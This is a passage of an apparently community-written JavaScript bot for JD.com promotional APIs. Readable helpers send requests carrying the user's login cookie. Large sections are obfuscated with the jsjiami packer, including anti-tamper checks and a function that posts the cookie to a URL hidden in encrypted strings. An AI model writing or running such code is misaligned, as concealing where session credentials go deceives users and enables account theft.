_0x7683x6=__Oxb24bc[0x5];const _0x7683x7=$[__Oxb24bc[0x6]]()?require(__Oxb24bc[0x7]):CryptoJS;let _0x7683x8=_0x7683x7.HmacSHA256(_0x7683x5,_0x7683x6).toString();return {url:`${__Oxb24bc[0x8]}${JD_API_HOST}${__Oxb24bc[0x9]}${_0x7683x2}${__Oxb24bc[0xa]}${escape(JSON[__Oxb24bc[0x1]](_0x7683x3))}${__Oxb24bc[0xb]}${_0x7683x4}${__Oxb24bc[0xc]}${_0x7683x8}${__Oxb24bc[0x8]}`,headers:{'\x48\x6F\x73\x74':__Oxb24bc[0xd],'\x61\x63\x63\x65\x70\x74':__Oxb24bc[0xe],'\x6B\x65\x72\x6E\x65\x6C\x70\x6C\x61\x74\x66\x6F\x72\x6D':__Oxb24bc[0xf],'\x75\x73\x65\x72\x2D\x61\x67\x65\x6E\x74':__Oxb24bc[0x10],'\x61\x63\x63\x65\x70\x74\x2D\x6C\x61\x6E\x67\x75\x61\x67\x65':__Oxb24bc[0x11],'\x43\x6F\x6F\x6B\x69\x65':cookie}}}(function(_0x7683x9,_0x7683xa,_0x7683xb,_0x7683xc,_0x7683xd,_0x7683xe){_0x7683xe= __Oxb24bc[0x12];_0x7683xc= function(_0x7683xf){if( typeof alert!== _0x7683xe){alert(_0x7683xf)};if( typeof console!== _0x7683xe){console[__Oxb24bc[0x13]](_0x7683xf)}};_0x7683xb= function(_0x7683x7,_0x7683x9){return _0x7683x7+ _0x7683x9};_0x7683xd= _0x7683xb(__Oxb24bc[0x14],_0x7683xb(_0x7683xb(__Oxb24bc[0x15],__Oxb24bc[0x16]),__Oxb24bc[0x17]));try{_0x7683x9= __encode;if(!( typeof _0x7683x9!== _0x7683xe&& _0x7683x9=== _0x7683xb(__Oxb24bc[0x18],__Oxb24bc[0x19]))){_0x7683xc(_0x7683xd)}}catch(e){_0x7683xc(_0x7683xd)}})({})

function taskGetUrl(function_id, body) {
  return {
    url: `https://api.m.jd.com/?appid=activities_platform&functionId=${function_id}&body=${escape(JSON.stringify(body))}&t=${+new Date()}`,
    headers: {
      'Cookie': cookie,
      'Host': 'api.m.jd.com',
      'Accept': '*/*',
      'Connection': 'keep-alive',
      'user-agent': $.isNode() ? (process.env.JS_USER_AGENT ? process.env.JS_USER_AGENT : (require('./JS_USER_AGENTS').USER_AGENT)) : ($.getdata('JSUA') ? $.getdata('JSUA') : "'jdltapp;iPad;3.1.0;14.4;network/wifi;Mozilla/5.0 (iPad; CPU OS 14_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148;supportJDSHWK/1"),
      'Accept-Language': 'zh-Hans-CN;q=1,en-CN;q=0.9',
      'Accept-Encoding': 'gzip, deflate, br',
      'Content-Type': "application/x-www-form-urlencoded",
      "referer": "https://an.jd.com/babelDiy/Zeus/q1eB6WUB8oC4eH1BsCLWvQakVsX/index.html"
    }
  }
}
function TotalBean() {
  return new Promise(async resolve => {
    const options = {
      "url": `https://wq.jd.com/user/info/QueryJDUserInfo?sceneval=2`,
      "headers": {
        "Accept": "application/json,text/plain, */*",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "zh-cn",
        "Connection": "keep-alive",
        "Cookie": cookie,
        "Referer": "https://wqs.jd.com/my/jingdou/my.shtml?sceneval=2",
        "User-Agent": $.isNode() ? (process.env.JD_USER_AGENT ? process.env.JD_USER_AGENT : (require('./USER_AGENTS').USER_AGENT)) : ($.getdata('JDUA') ? $.getdata('JDUA') : "jdapp;iPhone;9.2.2;14.2;%E4%BA%AC%E4%B8%9C/9.2.2 CFNetwork/1206 Darwin/20.1.0")
      }
    }
    $.post(options, (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (data) {
            data = JSON.parse(data);
            if (data['retcode'] === 13) {
              $.isLogin = false; //cookie过期
              return
            }
          } else {
            console.log(`京东服务器返回空数据`)
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}

function safeGet(data) {
  try {
    if (typeof JSON.parse(data) == "object") {
      return true;
    }
  } catch (e) {
    console.log(e);
    console.log(`京东服务器访问数据为空，请检查自身设备网络情况`);
    return false;
  }
}

function jsonParse(str) {
  if (typeof str == "string") {
    try {
      return JSON.parse(str);
    } catch (e) {
      console.log(e);
      $.msg($.name, '', '请勿随意在BoxJs输入框修改内容\n建议通过脚本去获取cookie')
      return [];
    }
  }
}
var _0xodE='jsjiami.com.v6',_0xcadb=[_0xodE,'HcKMw7A/w7E=','w5HCpGoKdQ==','UsOMOMKrwqdfwpPDrTTDi8OYw6ACGwEVw5tKBsK2UcO9wqoDw4EMT8OQwq3Dvz5Rw5bDvsOBw65jW0UePi7CtX8eICzDgA1Qw5AeW8OOw6wjXsKPw6pzwoXDpizDrcOUwr7DgMOhwpLCmwVSWMKzIMKwwqRwJF1jSQ==','Xxw6woZwQ11yDmRiL8OHw4jCuMOsYUlUDMOfXQvDvl7DrsOzXAJOQsOkwrUgwozCtRLDiiV2GsOFw5ZKw5o1XMOMw6ZwHcKHVlbCnMOZbMOEwoIzfMKyIcOUfcOCP8Orw4AUQsOBKAjCkDnDrx7DvgzCq8OYwoRiLcKcNcOZZiIHK3vCvSckw77Ds8KAwozChsOMw4R1JsO/w63CpsKGw5PDk1VZwpZ2wqHChsKpAMKyw5YFJAo0cgHDmznCnGNzw7/CpRwRwroea8OCLsOpwoLCrsOkw7cGYgdIQn4zMwJ2','w7VVwp07w6Q=','wqh7e8KPwrQ=','w7tbRSTCmA==','Yw/CswZk','w7/Cjn8RUQ==','wqQcYcKCZQ==','ASoYw4LDvQ==','VzEPwp5I','dXM4','Pjk8HcKz','bk/CgsKRw6M=','wrRzPCHCvA==','w4t5wpPDocKb','HMKYw7gPw5Y=','wpMIKsKWIRo=','K8ObDg==','w5VswoY6','w77Cp1LCqiM=','OTgEC8Kp','wrJ3w7Ebw5c=','FzIT','ClDDrMK8','EcKiU37or4Pms4Xlp4jotpzvvKbor6/moIbmnI7nvqrotprphozoroM=','wqLDt8Oaw60M','UcOMw65bwrTDrAE=','w6zCrXbCiCw=','w7xbXzHCsA==','AFDDtcK4f8KQUA==','fhYuwohoRw==','SMKdQB/DiA==','UcKYwoDDnD7CqMOS','f3HCnB/Clw==','w4UUw4vCmmrDvw==','wpsawr5Rw4UlSQ==','w41AbAXCvg==','TcOfw61ywrc=','wpMUwq11w7Ay','T8OEw5xMwpU=','SsOfw7/DjMOg','b8OHw5fDtMOM','w6VRw7fDpDc=','ABQKGsKg','dwsYwqt1','X8KLwpbDiT0=','wp4LwqMew69uVwYie1sA','CS0FAcO5P8OLEcK+wrjCn8KVw4vDj8KdRsOKf1gnMMOeKRFOwqM9d2MFwpfDksKq','Gi0EIcK4dsKyMsOQMMKJcigzworCpsO5TMOEw6zCh2LDqDhmwo48HjI3ckEa','cXTDl8OzTsOow77DtjvDrhJKZcKRbgfDtioUwo8TU0kkw4MrWEs=','w5wnwpvDgsOI','acKbI8KtcsOmw78IaREqwpBEw5TDgjk=','ZMOlw6PDqg==','w5gRwq5cw7YhTRI3cWQMd8Kewr/CjzTDqsO1PzZQw7zDksKmw5p9wozDgVHCucO9wqJLZ8KNQMO0w7DCnsOjwrvCsgHDv8O4wqnDssKEwoXCln8UDh4cw7DCkHvCj8Ohw4t8woMrw41yw4PDnsOjKMKCNSZGw50VKMOyAjHCs00hw5dsw4zDtx9ZHcKBKgtUTMOKwqfCssOQbTnCv8KQw7REw71RYcOdwoPDgsKkw6PCtjvDkcOew4spEcO9w6Mbfk7DrmUywqfDjcKbw7DDnl/DlsOrbF55w70hw7RIwo19ORAmGcKPPMK5aQ==','Q8O9w4zDg8OmAznDksKAw51SwoHDqloENUjDs8OXw60vJsKNw7c0acKtw4I+','YMOLw5/DkcKc','C8KVTcKSwow=','woXDjsOtw4wz','cMK2wpvDsj4=','EC8gOcKW','wpdywqMBNA==','RhXCqSZc','wr0ewpJow6A=','w6FYWTvCrg==','w6ogw4rCvmo=','wpENW8KLeQ==','w5l6w4zDgTfCm0nCosOv','XcOZw65KwoDCs1rCusKcwoEmw4XCn8Khw5t2P8OxwrLCrcKXKsO0CA==','w5p5wpdNw7U=','BhY0JMOe','w55QVDvCkA==','wroQesKfXQ==','XsKveVR/','SAF3W1s5','w7tefw==','wo9Rw6EGw6bCuMKJwpNnHX4JAw==','PsKOSA==','ayFmYWwZbXfCvH3CvyXDqQ==','w7EIw6HDpsOP','w48fw5PDjsOT','wpFkW8KswonDnXnDqcOZwrQ=','w4hbSxXClsKqeg==','w4NYw7zDmCI=','w7lVfQTCu3fCvQ==','YsO9w4zDsMKo','dlECwpLCmA==','aTTCvRVY','wolIwrsqJhITcsOnwqzCnMKWF8KWLzIlHMKVwrBLw5PCjMKIwphTJsKfwqg2EhB4XnfCky4Yw6xycR7DklPCpsKeVMK0asOwXcKzwpPCslY3UikLw5xVB8OOwrbDhGA5w4V0aH3Dl8KANzVrwocJbsOYPQLCusOmw6gNw4whMsKcw49cw6U7','woXDpDE9WxvDnDXDplspw7BDB0fDiMK8TCfCtzLDo0FHwqJJTGwQw7nCl8O3w7XDsE/DnhbDlcKSwpg5LMOFEAtxRCLDoMKGwr3DsEE7w4B8SFp9fcKCwpzDtw3DgU9ow7h2WVNDw7nDk8KvwqtgwqfCo8OawrvCgsOebU0DfsOcBMOEFsO4fVdywqTCrw3Cp1DCqMOlOMKKwpnCkxUNUsKiL8Kiw70Pw5M7R0N/OcKawr7Dh8KeFcOjYsKTYMKEEljCn8KzbsO+CsOww5/DqcOgSR9owpg8w63DrsOUN8OGw7ZqZ8Kfwo0vMlHDvsO5NMKEwpDChcOLw5wZRcOqGQzCssOcRMKWCcKxw6E9wqHDpcOqY1fCiDHClsKgw41+wqTCgV8WwqfCtzzDsjgxKR/CqsOPwqbDqQJXw4vCrT8BbgfCuiZjQiQIK8KUVcOAwqPCiynCrzceS8KCw4/DqTDCgVLDmcKSw74+wrHDq8Oww4HCp2nDnsKoVsOpdXfCr8OXU8OJwrxicsODVwc3wrMQ','Ynk/wqI=','eMKdXzjDlw==','ZkbCmMKDwoE=','NDAHGMK3','wp5VHQbCgw==','w4RHw4TCsMKv','bnZMPBE=','woTDo8OnR8OJ','w77ChFzCgx4=','LcKCwoY=','L8KMwowg','woYOw6bDqOitkeawoeWmqei1tO+/v+itrOagi+adsue/uei3g+mGqeiumQ==','w4tswpksw7I=','w5pjw6TCmsK1','w45ewogsw74=','SlvChMKAw6Q=','w40Uw73Cs3Q=','bA/CvQ==','bgHCtyI=','AXXCmMKw6Ky05rK15aSi6LSg772E6K2p5qCJ5p2557yX6LSD6YSE6K2R','XGDCiwnClg==','OFMJVzJG','HnDDucK9SA==','fnXDm8O6cQ==','w4HCumsPcg==','wohVTMKmwpE=','wqltw5kWw4fCjw==','w6ggw5HDtsOU','EBYfOcOF','YsOZOMKOwoM=','w7TCnX3CsAw=','wpZHPTPCow==','w79TwrZjw7I=','wovDnsOQUcOY','Gi0dY8K8O8K5IsKXPMKIMA==','VMKJwoTDkRDCrsOHwq1NTMOzHnrDmS7CsMKoGsKiwpJmw4PCmsKLw79yDMOJwpV9w4LDscKI','wodQNCfCgsOWK01CwoMpw6zDgA1ww5svw4nCvklCwoVGwrhGNGdDw77DvRLDmUw=','w7ZEfRDCqTnDs8OZKMONRMOTCMKxwpvCqFMcwrNawoQbw6kSwqs=','wpVVw7gqPA==','Lk/CkBRJw7LDtcODR8Ouw5DCqF7Cj0/Clw==','AcOBwrFkw7/CvMORVGDCgcKiIMK9wp8TwqJ/TH0mw6g5LSgZbMKZw4YTwoomfQDDszxYMlQHw7A+wqrDpMKRw7nDkyMJSjHDvynClEvCsXHDrQF0w7jDtMK/w7TCpsKFwokTwrjDn3BkwqbDhsOeQUzCkMKMwo98w4nCvjHCmsK4ecOWIcKxwrvDvC7Cp2kFw6bCk1Y3JgjDkTbCjTLCmGvDuMKNwpseXwTDksKCC8KOwq9Kw7jCohgcAsOfPXI7woRQwp/ChMOmw6t5w4kTwq5iwp1ew4/Cl3EQaBfCtsK9ck3CkH/CvA==','B34YYhU=','wrsxwq52w7M=','cBU3woRx','UEPDhsOofw==','K8Kdwo8hNA==','csOiw4TDh8KT','XsOlw4zDgMOi','CsK6RsKowps=','H30qcyY=','MsOiHsKuYA==','IRsyD8KH','worDhMOYesOswqU=','WMKNdV5Aw6LCi8OwTg==','XcKNwoDDjQrDt8KJw7ZFU8O0H33ChCvCusKqWcK5wpoxwojDgcOG','X3bDlMO6dQ==','wot7wrwlMw==','IhQ7K8KE','J3/DrMKYeQ==','w4JVVznCuQ==','wqbDvmcSw6RX','wqBsw4g=','wpjDhcO3w4s6w5Yjw7DCmsKqA8OHwrk=','wqFZaA==','C8K+wr4QPSHDosKdVnDDhcK8wrY=','a0TCiw3Cvw==','LSQaw4bDpA==','Ow4ww7XDksOtUMO+esKc','UsOIw65ewpLDvRQ=','w5duwqLDmsKH','A1TDtcK9WcKBRQ==','wpLDhMO0UsOE','w6jCi3PCgRE=','w4t1wp3Dh8Kuw47DncKYIzBVC8KywpjDqcOawo/DucOKP8Kbwr1LWSjDgW7DtcKCwqF9LntEGEbCsA==','w4A6w5jDgsOSCsO3P8K6w7/DtsODw4lfDwVcAcKeGV7DvcOTXyDDjMOuQHTDpW9iw7DClhArwqPDmcONaDZ4ADTCvgEGwrnDinhMCcOIQzNGw5bCqcOhw4gBAMOUccO4IyZSwpZXwrvDj0HCqcO0wqHChyrDj0fChcOuMsK/OMKsdzMDKGduwqliwrAGSsO+w7fCs8O6w6Fbw5AawrMDLnnDqcKDY8Kjwq0=','IQ0tD8Km','ecOMHMKlwoPClDPCncKAVsOpw4M4w4jCnQXCnGNzwq7DpCZAY0TDvGx5IMKiI2Iyw53ClsOkZMO7wqZjH3MR','w5Ygw4XDlQ==','e03Dl8OtaA==','X1kHwrnChA==','J8KDwoUJCg==','acObw63DksKi','XsKzfxfDjw==','wq0iDMKWAg==','VsOKwqd7w64=','c8K4YQ==','wrzDt8OFw7s=','wr5xWSnorK3msYHlp63ot5PvvYXorYnmo7fmnZ/nvL7otLDphLvorJg=','c8O8w77DrsKc','RcKOZVNm','wptQwrMtAA==','w4Uew4I=','UWnCisKW','w4ZhFALorJzms7flpbvotJzvvKforJvmoofmnKbnv6not4/ph4rorbk=','b8K2dAXDpA==','bA/CvQJkw5U=','RsODw7PDgsOk','dW/DhA==','w41gwoTDkg==','Thwlw67orbrms67lpKbotp7vvLjorL/mo7fmnLvnvLbotI7phZnorbI=','w4FGwrM3w4M=','wrNnLR/ChA==','XMKLeWZH','wowfL8KfIw==','w7ZEfRDCqTnDs8OZOsOWQsODCsOow4TDo14Hw7lZwo5SwqQTwqPCnQfDqcKlPMOSwpzDomzCh8KXwqYTPmLCpcKlwpEfw6fDmsOUbAnDrzLCuMKfw5bDn8Kuwo4nPh7DpApbcMKAwoQpw5MJJzxgw4xBw7cTQ8OQFQXCqw==','FsKPRMK4wpbCiDfCkMKPScKkwp42w4DCvR3Cmmkrw7jCpRd7UxDCuEhwPMKnaypIwqjDg8KgPsOAwqkacydAwpwww5nDhXDDsnrCmCIuw6TCnEAGw4HCtw45woLDpVvCk8KITsOOw6pNwppcPW8OwrEnw4DCnEUywovCpifDpDrCusK5CR7DsEnDqWHDr2fCqWIvaMKnfMKvwpjDu8Khwo9mwr7Di8KPEsOfw5kVwoU5esOEIsK5wo1RfkDCqMKVwqbCqXpVQR/CmsKPwp/DnMK1GXxAwrnCpMOEw4ALfMOkISvDgsKFEDBNOQ==','w7VKRizCkg==','fmPCsR3CtA==','w7p+wq1ow5o=','wpZZwocGFw==','w7ZqwoFQw4g=','w6xHw67Ct8KI','w77Cn14YeQ==','w5Ejw6HDp8OW','SHzCuMKowpU=','w47CrkzCnA4=','w6Z3YC/CtA==','I8KnV8KewpQ=','G8Ouw7k=','UFHDmsOqVA==','aQhYV00=','wq4XCMKcNQ==','csO+CMKPwoc=','NnEaVwI=','EcKKSsK7wqw=','wqHDrEQY','RHDDkcKQ6K+P5rK35aSV6LeX772T6KyT5qOe5p68572F6LWe6Yeh6K6J','ARYXKsOd','KsO5IMK3bA==','QUzCsDPCsg==','TR1e','wo4FX8Ks','dcK3w7kS6K2P5rKQ5aeH6LSt776H6K6s5qK15p+757yf6LSW6YS56KyB','GMOqw7nDl8O8DsKp','RcOMw6hJwpY=','d3HDhMOPbQ==','CjwBw4bDisOJYw==','w7DCqWrCnD1P','woxUAinCpg==','MF0acwdRw4Q=','KC0RKMK1','OFkAdTRc','w4dgwp3DlsKawpHChg==','woHDpsONw7sN','VlXCocKN','wrl/wrovEA==','w5hdwqle','WHw4wrzChw==','w4NRWDTChcKs','w5bCpnDCkR8=','SsOZPsKowrE=','RMOXw6x8woY=','KjsBjiami.cRoxm.vS6JKItIrnFVK=='];(function(_0x277a7e,_0x4095f8,_0x14204b){var _0x5644a1=function(_0x59b1e1,_0x36f622,_0x25a0ef,_0x17e365,_0xce9d00){_0x36f622=_0x36f622>>0x8,_0xce9d00='po';var _0x74d580='shift',_0x58bba3='push';if(_0x36f622<_0x59b1e1){while(--_0x59b1e1){_0x17e365=_0x277a7e[_0x74d580]();if(_0x36f622===_0x59b1e1){_0x36f622=_0x17e365;_0x25a0ef=_0x277a7e[_0xce9d00+'p']();}else if(_0x36f622&&_0x25a0ef['replace'](/[KBRxSJKItIrnFVK=]/g,'')===_0x36f622){_0x277a7e[_0x58bba3](_0x17e365);}}_0x277a7e[_0x58bba3](_0x277a7e[_0x74d580]());}return 0x8cab9;};var _0x12ce9e=function(){var _0x375989={'data':{'key':'cookie','value':'timeout'},'setCookie':function(_0x73be40,_0xf995e0,_0x1a6b67,_0x3e95ea){_0x3e95ea=_0x3e95ea||{};var _0x464e94=_0xf995e0+'='+_0x1a6b67;var _0x1ee3a3=0x0;for(var _0x1ee3a3=0x0,_0x3e649c=_0x73be40['length'];_0x1ee3a3<_0x3e649c;_0x1ee3a3++){var _0x27a8ef=_0x73be40[_0x1ee3a3];_0x464e94+=';\x20'+_0x27a8ef;var _0x27f217=_0x73be40[_0x27a8ef];_0x73be40['push'](_0x27f217);_0x3e649c=_0x73be40['length'];if(_0x27f217!==!![]){_0x464e94+='='+_0x27f217;}}_0x3e95ea['cookie']=_0x464e94;},'removeCookie':function(){return'dev';},'getCookie':function(_0x299e8e,_0x178ce5){_0x299e8e=_0x299e8e||function(_0x1c78ed){return _0x1c78ed;};var _0x2e8a9a=_0x299e8e(new RegExp('(?:^|;\x20)'+_0x178ce5['replace'](/([.$?*|{}()[]\/+^])/g,'$1')+'=([^;]*)'));var _0x321a04=typeof _0xodE=='undefined'?'undefined':_0xodE,_0x591d47=_0x321a04['split'](''),_0x2195f0=_0x591d47['length'],_0x3cf972=_0x2195f0-0xe,_0x54fe75;while(_0x54fe75=_0x591d47['pop']()){_0x2195f0&&(_0x3cf972+=_0x54fe75['charCodeAt']());}var _0x21f455=function(_0x294cea,_0x446a17,_0x3a9d7c){_0x294cea(++_0x446a17,_0x3a9d7c);};_0x3cf972^-_0x2195f0===-0x524&&(_0x54fe75=_0x3cf972)&&_0x21f455(_0x5644a1,_0x4095f8,_0x14204b);return _0x54fe75>>0x2===0x14b&&_0x2e8a9a?decodeURIComponent(_0x2e8a9a[0x1]):undefined;}};var _0x17b25a=function(){var _0x1f107f=new RegExp('\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*[\x27|\x22].+[\x27|\x22];?\x20*}');return _0x1f107f['test'](_0x375989['removeCookie']['toString']());};_0x375989['updateCookie']=_0x17b25a;var _0x2eb92e='';var _0x38b622=_0x375989['updateCookie']();if(!_0x38b622){_0x375989['setCookie'](['*'],'counter',0x1);}else if(_0x38b622){_0x2eb92e=_0x375989['getCookie'](null,'counter');}else{_0x375989['removeCookie']();}};_0x12ce9e();}(_0xcadb,0x11d,0x11d00));var _0x5115=function(_0x1bca55,_0x1cbab1){_0x1bca55=~~'0x'['concat'](_0x1bca55);var _0x271263=_0xcadb[_0x1bca55];if(_0x5115['sqqmnk']===undefined){(function(){var _0x35e4ca;try{var _0x21c9d2=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');_0x35e4ca=_0x21c9d2();}catch(_0x407af1){_0x35e4ca=window;}var _0x443e15='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x35e4ca['atob']||(_0x35e4ca['atob']=function(_0x55d96f){var _0x397c46=String(_0x55d96f)['replace'](/=+$/,'');for(var _0x29c912=0x0,_0x2f9186,_0x3a83df,_0x2f4c70=0x0,_0x3a6011='';_0x3a83df=_0x397c46['charAt'](_0x2f4c70++);~_0x3a83df&&(_0x2f9186=_0x29c912%0x4?_0x2f9186*0x40+_0x3a83df:_0x3a83df,_0x29c912++%0x4)?_0x3a6011+=String['fromCharCode'](0xff&_0x2f9186>>(-0x2*_0x29c912&0x6)):0x0){_0x3a83df=_0x443e15['indexOf'](_0x3a83df);}return _0x3a6011;});}());var _0x370da2=function(_0x18ad4c,_0x1cbab1){var _0x39ef4d=[],_0x3327d7=0x0,_0x149fca,_0x344d45='',_0x42c243='';_0x18ad4c=atob(_0x18ad4c);for(var _0x153fe5=0x0,_0x26642f=_0x18ad4c['length'];_0x153fe5<_0x26642f;_0x153fe5++){_0x42c243+='%'+('00'+_0x18ad4c['charCodeAt'](_0x153fe5)['toString'](0x10))['slice'](-0x2);}_0x18ad4c=decodeURIComponent(_0x42c243);for(var _0x56eb5a=0x0;_0x56eb5a<0x100;_0x56eb5a++){_0x39ef4d[_0x56eb5a]=_0x56eb5a;}for(_0x56eb5a=0x0;_0x56eb5a<0x100;_0x56eb5a++){_0x3327d7=(_0x3327d7+_0x39ef4d[_0x56eb5a]+_0x1cbab1['charCodeAt'](_0x56eb5a%_0x1cbab1['length']))%0x100;_0x149fca=_0x39ef4d[_0x56eb5a];_0x39ef4d[_0x56eb5a]=_0x39ef4d[_0x3327d7];_0x39ef4d[_0x3327d7]=_0x149fca;}_0x56eb5a=0x0;_0x3327d7=0x0;for(var _0xf836d8=0x0;_0xf836d8<_0x18ad4c['length'];_0xf836d8++){_0x56eb5a=(_0x56eb5a+0x1)%0x100;_0x3327d7=(_0x3327d7+_0x39ef4d[_0x56eb5a])%0x100;_0x149fca=_0x39ef4d[_0x56eb5a];_0x39ef4d[_0x56eb5a]=_0x39ef4d[_0x3327d7];_0x39ef4d[_0x3327d7]=_0x149fca;_0x344d45+=String['fromCharCode'](_0x18ad4c['charCodeAt'](_0xf836d8)^_0x39ef4d[(_0x39ef4d[_0x56eb5a]+_0x39ef4d[_0x3327d7])%0x100]);}return _0x344d45;};_0x5115['viLPRM']=_0x370da2;_0x5115['RdVOkg']={};_0x5115['sqqmnk']=!![];}var _0x9d6c9d=_0x5115['RdVOkg'][_0x1bca55];if(_0x9d6c9d===undefined){if(_0x5115['DHeOXw']===undefined){var _0x26c68f=function(_0x1f69b1){this['BHBHNa']=_0x1f69b1;this['cWhHln']=[0x1,0x0,0x0];this['GPwBWD']=function(){return'newState';};this['fRQqfA']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*';this['VDPsbn']='[\x27|\x22].+[\x27|\x22];?\x20*}';};_0x26c68f['prototype']['rtEjoX']=function(){var _0x546ade=new RegExp(this['fRQqfA']+this['VDPsbn']);var _0x179080=_0x546ade['test'](this['GPwBWD']['toString']())?--this['cWhHln'][0x1]:--this['cWhHln'][0x0];return this['jhudmd'](_0x179080);};_0x26c68f['prototype']['jhudmd']=function(_0x78b2cf){if(!Boolean(~_0x78b2cf)){return _0x78b2cf;}return this['CZCjCa'](this['BHBHNa']);};_0x26c68f['prototype']['CZCjCa']=function(_0x177a0f){for(var _0x1687e3=0x0,_0x3b9f63=this['cWhHln']['length'];_0x1687e3<_0x3b9f63;_0x1687e3++){this['cWhHln']['push'](Math['round'](Math['random']()));_0x3b9f63=this['cWhHln']['length'];}return _0x177a0f(this['cWhHln'][0x0]);};new _0x26c68f(_0x5115)['rtEjoX']();_0x5115['DHeOXw']=!![];}_0x271263=_0x5115['viLPRM'](_0x271263,_0x1cbab1);_0x5115['RdVOkg'][_0x1bca55]=_0x271263;}else{_0x271263=_0x9d6c9d;}return _0x271263;};var _0x2f4cf7=function(){var _0x558dae=!![];return function(_0x49e8a6,_0x3ca524){var _0x98ac90=_0x558dae?function(){if(_0x3ca524){var _0xdb1b6=_0x3ca524['apply'](_0x49e8a6,arguments);_0x3ca524=null;return _0xdb1b6;}}:function(){};_0x558dae=![];return _0x98ac90;};}();var _0x461433=_0x2f4cf7(this,function(){var _0x38b4df=function(){return'\x64\x65\x76';},_0x3fa5a8=function(){return'\x77\x69\x6e\x64\x6f\x77';};var _0x13a901=function(){var _0x43c259=new RegExp('\x5c\x77\x2b\x20\x2a\x5c\x28\x5c\x29\x20\x2a\x7b\x5c\x77\x2b\x20\x2a\x5b\x27\x7c\x22\x5d\x2e\x2b\x5b\x27\x7c\x22\x5d\x3b\x3f\x20\x2a\x7d');return!_0x43c259['\x74\x65\x73\x74'](_0x38b4df['\x74\x6f\x53\x74\x72\x69\x6e\x67']());};var _0x437198=function(){var _0x4105c7=new RegExp('\x28\x5c\x5c\x5b\x78\x7c\x75\x5d\x28\x5c\x77\x29\x7b\x32\x2c\x34\x7d\x29\x2b');return _0x4105c7['\x74\x65\x73\x74'](_0x3fa5a8['\x74\x6f\x53\x74\x72\x69\x6e\x67']());};var _0x51c292=function(_0x34e387){var _0x3f8b03=~-0x1>>0x1+0xff%0x0;if(_0x34e387['\x69\x6e\x64\x65\x78\x4f\x66']('\x69'===_0x3f8b03)){_0x4851b1(_0x34e387);}};var _0x4851b1=function(_0x652c53){var _0xd45dff=~-0x4>>0x1+0xff%0x0;if(_0x652c53['\x69\x6e\x64\x65\x78\x4f\x66']((!![]+'')[0x3])!==_0xd45dff){_0x51c292(_0x652c53);}};if(!_0x13a901()){if(!_0x437198()){_0x51c292('\x69\x6e\x64\u0435\x78\x4f\x66');}else{_0x51c292('\x69\x6e\x64\x65\x78\x4f\x66');}}else{_0x51c292('\x69\x6e\x64\u0435\x78\x4f\x66');}});_0x461433();function wuzhi01(_0x4c20b0){var _0x5d7b23={'qzUQU':function(_0x4e1037){return _0x4e1037();},'PusCv':function(_0x2b1177,_0x5f17f5){return _0x2b1177===_0x5f17f5;},'WXERZ':_0x5115('0','R[UZ'),'EOoOG':_0x5115('1','jWD&'),'krTtG':function(_0x5a9945,_0x28be95){return _0x5a9945!==_0x28be95;},'xOvHf':_0x5115('2','p#)L'),'FusaJ':function(_0x1b6a0e,_0x57c46f){return _0x1b6a0e!==_0x57c46f;},'BeXXb':_0x5115('3','g%zL'),'NffJY':_0x5115('4','n3r8'),'CQoCt':_0x5115('5','5tyk'),'qiiBQ':function(_0x11eceb){return _0x11eceb();},'uEWgk':_0x5115('6','(rbN'),'nKAIN':_0x5115('7','Z%Qh'),'qnkJg':_0x5115('8','T1e2'),'ZtHVu':_0x5115('9','mp@@'),'oLzcK':_0x5115('a','OK9C'),'WGWGi':function(_0x18a575,_0x5de847){return _0x18a575(_0x5de847);},'iPeou':_0x5115('b',')7ac'),'sLFpa':_0x5115('c','R[UZ'),'dGNDI':_0x5115('d','(rbN'),'iTgRN':_0x5115('e','jWD&')};return new Promise(_0xa8b187=>{var _0x898c79={'gJYNV':function(_0x22084c){return _0x5d7b23[_0x5115('f','vmZ&')](_0x22084c);},'GrPzB':function(_0x1a05cd,_0x2af223){return _0x5d7b23[_0x5115('10','lq!A')](_0x1a05cd,_0x2af223);},'OmsUf':_0x5d7b23[_0x5115('11','T]!N')],'xuYMh':_0x5d7b23[_0x5115('12','5tyk')],'hyiew':function(_0x125804,_0x1e00a1){return _0x5d7b23[_0x5115('13','T1e2')](_0x125804,_0x1e00a1);},'bHXxW':_0x5d7b23[_0x5115('14','*G@Q')],'zAxdp':function(_0x571f6a,_0x375e66){return _0x5d7b23[_0x5115('15','Rwm%')](_0x571f6a,_0x375e66);},'uScsi':_0x5d7b23[_0x5115('16','(rbN')],'guxyL':_0x5d7b23[_0x5115('17','&eEu')],'frxQA':_0x5d7b23[_0x5115('18','BqpE')],'LbRXG':function(_0x1c0097){return _0x5d7b23[_0x5115('19','evtc')](_0x1c0097);}};let _0x4833c1=+new Date();let _0x4026bd=_0x4c20b0[_0x5115('1a','p#)L')];let _0x322730={'url':_0x5115('1b','byi4')+ +new Date(),'headers':{'Host':_0x5d7b23[_0x5115('1c','EnTL')],'accept':_0x5d7b23[_0x5115('1d','Z%Qh')],'content-type':_0x5d7b23[_0x5115('1e','&eEu')],'origin':_0x5d7b23[_0x5115('1f','evtc')],'accept-language':_0x5d7b23[_0x5115('20','dY^4')],'user-agent':$[_0x5115('21','zty7')]()?process[_0x5115('22','YolQ')][_0x5115('23','byk#')]?process[_0x5115('24','lq!A')][_0x5115('25','zty7')]:_0x5d7b23[_0x5115('26','OK9C')](require,_0x5d7b23[_0x5115('27','OK9C')])[_0x5115('28','kWSI')]:$[_0x5115('29','&eEu')](_0x5d7b23[_0x5115('2a','p#)L')])?$[_0x5115('2b','YolQ')](_0x5d7b23[_0x5115('2c','vmZ&')]):_0x5d7b23[_0x5115('2d','Q2YS')],'referer':_0x5d7b23[_0x5115('2e','Rwm%')],'Cookie':cookie},'body':_0x5115('2f','*G@Q')+_0x4026bd+_0x5115('30','!z6T')+_0x4833c1};$[_0x5115('31','Q2YS')](_0x322730,(_0x46e681,_0x2e823a,_0x4270ed)=>{var 